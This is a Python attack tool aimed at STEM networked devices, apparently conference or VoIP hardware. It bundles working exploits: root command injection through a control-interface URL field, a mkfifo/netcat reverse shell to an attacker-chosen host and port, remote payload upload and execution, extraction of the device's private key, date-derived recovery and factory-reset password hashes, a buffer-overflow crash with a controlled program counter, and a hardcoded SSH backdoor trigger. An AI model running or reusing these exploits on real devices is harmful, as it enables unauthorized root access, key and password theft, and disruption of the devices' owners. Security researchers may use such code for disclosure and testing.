#!/usr/bin/env python3

import sys
import socket 
import datetime
import time
import http.client
import numpy
import websockets
import asyncio
import argparse
import struct
import threading

import Crypto
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import base64

class StemDevice():
    SERVICE_NAMES = ['sip', 'control', 'http']

    def __init__(self, ip, ports):
        self.ip = ip
        self.connections = {}
        try:
            self.connections['sip'] =     {'port' : ports['sip']}
            self.connections['control'] = {'port' : ports['control']}
            self.connections['http'] =    {'port' : ports['http']}
        except KeyError as e:
            print('Port not provided: ' + str(e))

    @staticmethod
    def __generate_recovery_pw_hash(date):
        dateStr = date
        pwRecoverStr = dateStr[0] + "sTw7iFF" + dateStr[1] + "j20X" + dateStr[2] + "1z" + dateStr[3] + "3" + dateStr[4] + "Cd" + dateStr[5]

        pwRecoverHash = numpy.int32(0)
        for c in pwRecoverStr:
            pwRecoverHash = numpy.int32((pwRecoverHash*23) + ord(c))
        return ';' + str(pwRecoverHash) + ';'

    @staticmethod
    def __generate_factory_reset_hash(date):
        dateStr = date 
        factoryResetStr = dateStr[0] + "lol393a" + dateStr[1] + "leet" + dateStr[2] + "ww" + dateStr[3] + "Q" + dateStr[4] + "2f" + dateStr[5]

        factoryResetHash = numpy.int32(0)
        for c in factoryResetStr:
            factoryResetHash = numpy.int32(factoryResetHash*23 + ord(c))
        return ';' + str(factoryResetHash) + ';'

    def __send_leave_org_req(self, pw_hash): 
        stem.connect('control')
        stem.send('control', '@STEM_ORG_LEAVE_REQ:' + pw_hash)
        return stem.recv('control')

    def get_date(self):
        stem.connect('control')
        stem.send('control', self.ip + '@STEM_DATETIME_GET_REQ:255.255.255.255')
        ret = stem.recv('control')

        if 'STEM_DATETIME_GET_RSP' not in ret:
            return None

        # 2021-02-25-...
        # Take the first 10 chars
        return ret.split(':')[1][:10]

    def __light_test(self, color, state):
        req = self.ip + '@STEM_DEVICE_' + color.upper() +\
            '_LIGHT_TEST_' + state.upper() + ':'
        stem.connect('control')
        stem.send('control', req + ':')

    # Any 'off' color works
    def light_test_off(self):
        self.__light_test('blue', 'off')

    def blue_light_test_on(self):
        self.__light_test('blue', 'on')

    def red_light_test_on(self):
        self.__light_test('red', 'on')

    def run_payload(self, args):
        def handle_conn(self, sock, payload, uploading):
            (conn, addr) = sock.accept()
            conn.sendall(payload)
            uploading[0] = False

        args = args.split(';')
        ss = args[0].split(':')
        with open(args[1], 'rb') as f:
            payload = f.read()

        uploading = [True]
        sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        sock.bind((ss[0], int(ss[1])))
        sock.listen(1)
        t = threading.Thread(target=handle_conn, args=(self, sock, payload, uploading))
        t.start()

        self.remote_cmd('nc {:s} {:s} > /tmp/payload'.format(ss[0], ss[1]))
        while(uploading[0]):
            pass

        self.remote_cmd('chmod +x /tmp/payload')
        self.remote_cmd('killall payload')
        self.remote_cmd('/tmp/payload &')
        t.join()

    def get_private_key(self):
        self.connect('http')
        self.send('http', '/cgi-bin/privatekey.pem')
        key = self.recv('http')

        with open('privatekey.pem', 'w') as f:
            f.write(key)

        print('Acquired privatekey.pem')

    # Decrypt data that is passed from the UI to the device
    # This data is encrypted with the included private key, then base64 encoded
    def decrypt(self, msg):
        try:
            with open('privatekey.pem', 'rb') as f:
                rsa_key = RSA.importKey(f.read())
                cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=Crypto.Hash.SHA256)
                print(cipher.decrypt(base64.b64decode(msg)))
        except OSError:
            print('No private key found')
            print('Use \'--func key\' to first obtain the private key from the device')

    # yyyy-mm-dd -> ddmmyy
    def __reorder_date_for_hash(self, date):
        comps = date.split('-')
        return comps[2] + comps[1] + comps[0][2:]

    def remote_cmd(self, cmd):
        self.connect('control')

        # The injected command
        req0 = self.ip + '@STEM_LOCAL_SERVER_URL_SET_REQ:`' +\
            cmd +\
            '`;;;'
        self.send('control', req0)

        if 'STEM_LOCAL_SERVER_URL_SET_RSP' not in self.recv('control'):
            return

        # The trigger
        req1 = self.ip + '@STEM_FW_UPDATE_NOW_REQ:'
        self.send('control', req1)

        if 'STEM_FW_UPDATE_NOW_RSP' not in self.recv('control'):
            return

        # Reset the fields so as to not contain our commands
        self.send('control', self.ip + '@STEM_LOCAL_SERVER_URL_SET_REQ:;;;')

    def crash(self):
        self.connect('control')
        req0  = bytes(self.ip + '@STEM_LOCAL_SERVER_URL_SET_REQ:', 'utf-8')
        req0 += struct.pack('c', b'A') * (0x68 - 30)    # Buffer size less used bytes
        req0 += struct.pack('<I', 0x44444444)           # PC
        req0 += bytes(';;;', 'utf-8')

        self.send('control', str(req0, 'utf-8')) 
        if 'STEM_LOCAL_SERVER_URL_SET_RSP' not in self.recv('control'):
            return

        # The trigger
        req1 = self.ip + '@STEM_LOCAL_SERVER_URL_GET_REQ:'
        self.send('control', req1)
        print('Device should begin rebooting in ~15 seconds')

    # nc -kl ip port 
    def reverse_shell(self, args):
        ss = args.split(':')
        cmd =   'rm -f /tmp/a && ' +\
                'mkfifo /tmp/a && ' +\
                'cat /tmp/a | /bin/sh -i 2>&1 | ' +\
                'nc ' + ss[0] + ' ' + ss[1] + ' >/tmp/a && ' +\
                'rm -f /tmp/a'
        self.remote_cmd(cmd)
        print('Shell is available at {:s}:{:s}'.format(ss[0], ss[1]))

    def get_org_pw(self):
        date = self.__reorder_date_for_hash(self.get_date())
        pw_hash = StemDevice.__generate_recovery_pw_hash(date)
        ret = self.__send_leave_org_req(pw_hash)
        print('Password:' + ret.split(':')[1]) 

    def factory_reset(self):
        date = self.__reorder_date_for_hash(self.get_date())
        pw_hash = StemDevice.__generate_factory_reset_hash(date)
        self.__send_leave_org_req(pw_hash)

    def enable_ssh(self):
        stem.connect('control')
        stem.send('control', '@STEM_DEVICE_NAME_SET_REQ:cg34TPvGbAheDF2dgvRQ3dEc')

    def reboot(self):
        stem.connect('control')
        stem.send('control', self.ip + '@STEM_SYSTEM_RESTART_REQ:')

    def __service_check(self, service):
        if service not in StemDevice.SERVICE_NAMES:
            raise Exception('Unsupported service: ' + str(service))

    def connect(self, service):
        self.__service_check(service)

        # Already connected
        if None != self.connections[service].get('conn'):
            return

        port = self.connections[service]['port']
        try:
            if 'control' in service:
                conn = websockets.connect('ws://' + self.ip + ':' + port)
                conn = asyncio.get_event_loop().run_until_complete(conn)
            elif 'http' in service:
                conn = http.client.HTTPConnection(self.ip + ':' + port)
            else:
                conn = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
                conn.connect((self.ip, int(self.connections[service]['port'])))
        except Exception as err: 
            print('CONN\'EX: ' + str(err))
            raise Exception('Failed to connect to {:s}@{:s}:{:s}'.format(service, self.ip, port))

        self.connections[service]['conn'] = conn 

    def send(self, service, data):
        self.__service_check(service)
        conn = self.connections[service]['conn']

        try:
            if 'control' in service:
                asyncio.get_event_loop().run_until_complete(conn.send(data))
            elif 'http' in service:
                # GET only for now
                conn.request('GET', data)
            else:
                conn.sendall(data)
        except Exception as err:
            print('SEND\'EX: ' + str(err))
            raise Exception('Failed to send to {:s}@{:s}:{:s}'.format(service, self.ip, self.connections[service]['port']))
    
    def recv(self, service):
        self.__service_check(service)
        conn = self.connections[service]['conn']

        try:
            if 'control' in service:
                data = asyncio.get_event_loop().run_until_complete(conn.recv())
            elif 'http' in service:
                data = conn.getresponse().read().decode()
            else:
                data = conn.recv(1024)
        except Exception as err:
            print('RECV\'EX: ' + str(err))
            raise Exception('Failed to recv from {:s}@{:s}:{:s}'.format(service, self.ip, self.connections[service]['port']))

        return data

    def disconnect(self, service):
        self.__service_check(service)
        try:
            self.connetions[service]['conn'].close()
            self.connetions[service]['conn'] = None
        except Exception as err:
            print(err)
            raise Exception('Failed to disconnect from {:s}@{:s}:{:s}'.format(service, self.ip, self.connections[service]['port']))
            

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Interact with STEM devices')
    parser.add_argument('--ip', required=True, help='IP address of device')
    parser.add_argument('--sip-port', metavar='sp', default='5060', help='SIP port')
    parser.add_argument('--control-port', metavar='cp', default='8899', help='Control port')
    parser.add_argument('--http-port', metavar='cp', default='80', help='Http (webserver) port')
    parser.add_argument('--args', metavar='data', help='Arguments to func')
    parser.add_argument('--func', metavar='func', type=str, default=None,
        help='Function to execute. Use \'--func list\' for more info')
    parser.add_argument('--send', metavar='data', help='Send a string payload to endpoint')
    parser.add_argument('--recv', action='store_true', help='Recv from endpoint')
    parser.add_argument('--iface', required='--send' in sys.argv,
        choices=['sip', 'control'], help='Interface to send data; required for --send')

    args = parser.parse_args()

    def func_list(unused):
        print('{:20s}Description'.format('Function'))
        print('=' * 32)
        for k,v in funcs.items():
            print('{:20s}{:s}'.format(k, v['help']))

    # A function array for simplicity
    funcs = {
        'list' :
            {   'handler'   : func_list,
                'help'      : 'List function endpoints'
            },
        'payload' :
            {   'handler'   : StemDevice.run_payload,
                'help'      : 'Run payload; --args local-ip:local-port;path/to/payload',
                'args'      : args.args
            },
        'key' :
            {   'handler'   : StemDevice.get_private_key,
                'help'      : 'Extract the privatekey.pem from the device'
            },
        'decrypt' :
            {   'handler'   : StemDevice.decrypt,
                'help'      : 'Decrypt a encrypted message from the UI; --args \'msg\'',
                'args'      : args.args
            },
        'crash' :
            {   'handler'   : StemDevice.crash,
                'help'      : 'Trigger one of many buffer overflows in the control interface'
            },
        'reverse-shell' :
            {   'handler'   : StemDevice.reverse_shell, 
                'help'      : 'Spawn a reverse shell; --args ip:port',
                'args'      : args.args
            },
        'remote-cmd' :
            {   'handler'   : StemDevice.remote_cmd,
                'help'      : 'Run a remote command as root; --args \'cmd\'',
                'args'      : args.args
            },
        'enable-ssh' :
            {   'handler'   : StemDevice.enable_ssh,
                'help'      : 'Enable SSH \"backdoor\"'
            },
        'factory-reset' :
            {   'handler'   : StemDevice.factory_reset,
                'help'      : 'Execute a factory reset'
            },
        'reboot' :
            {   'handler'   : StemDevice.reboot,
                'help'      : 'Reboot the device'
            },
        'get-org-pw' :
            {   'handler'   : StemDevice.get_org_pw,
                'help'      : 'Request the ORG password',
            },
        'blue-led-on' :
            {   'handler'   : StemDevice.blue_light_test_on,
                'help'      : 'Turn the LED ring blue'
            },
        'led-off' :
            {   'handler'   : StemDevice.light_test_off,
                'help'      : 'Turn the LED ring off'
            },
        'red-led-on' :
            {   'handler'   : StemDevice.red_light_test_on,
                'help'      : 'Turn the LED ring red'
            },
    }

    try:
        stem = StemDevice(args.ip, {'sip'       : args.sip_port,
                                    'control'   : args.control_port,
                                    'http'      : args.http_port})

        # If user specified a specific endpoint
        if None is not args.func:
            if(funcs[args.func].get('args')):
                if args.args == 'help':
                    print(funcs[args.func]['help'])
                else:
                    funcs[args.func]['handler'](stem, funcs[args.func]['args'])
            else:
                funcs[args.func]['handler'](stem)
            sys.exit(1)

        # Otherwise check for generic send/recv functionality
        if args.send:
            stem.connect(args.iface)
            stem.send(args.iface, args.send)

        if args.recv:
            data = stem.recv(args.iface)
            print(str(data)) 

    except Exception as e:
        print('EXCEPTION: ' + str(e))
